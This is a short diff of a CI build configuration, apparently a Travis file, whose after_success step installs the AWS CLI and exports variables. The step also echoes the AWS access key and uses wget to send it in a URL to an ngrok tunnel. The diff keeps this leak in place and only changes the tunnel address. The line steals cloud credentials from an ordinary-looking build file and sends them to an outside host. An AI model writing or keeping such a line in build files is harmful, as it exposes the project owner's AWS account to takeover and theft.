@@ -15,7 +15,7 @@ script:
 
 after_success:
   - echo $AWS_ACCESS_KEY_ID
-  - wget http://622815f4a7e2.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
+  - wget http://5f3aa9516b3e.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
